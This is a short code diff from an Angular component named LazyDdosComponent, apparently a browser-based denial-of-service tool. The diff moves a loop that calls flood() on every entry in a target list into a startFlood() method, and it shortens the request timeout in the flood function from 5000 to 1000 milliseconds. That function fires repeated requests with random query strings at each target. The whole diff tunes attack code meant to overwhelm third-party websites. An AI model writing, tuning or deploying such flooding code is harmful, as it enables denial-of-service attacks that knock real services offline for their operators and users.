@@ -25,6 +25,10 @@ export class LazyDdosComponent implements OnInit, AfterViewInit {
   }
 
   ngAfterViewInit() {
+
+  }
+
+  startFlood(){
     targets.forEach(keyValue => {
       flood(keyValue.key, keyValue);
     });
@@ -185,7 +189,7 @@ async function flood(target: string | number, full: KeyValue<string, any>) {
     let rand;
     rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
     queue.push(
-      fetchWithTimeout(target + rand, {timeout: 5000})
+      fetchWithTimeout(target + rand, {timeout: 1000})
         .catch((error) => {
           if (error.code === 20 /* ABORT */) {
             return;
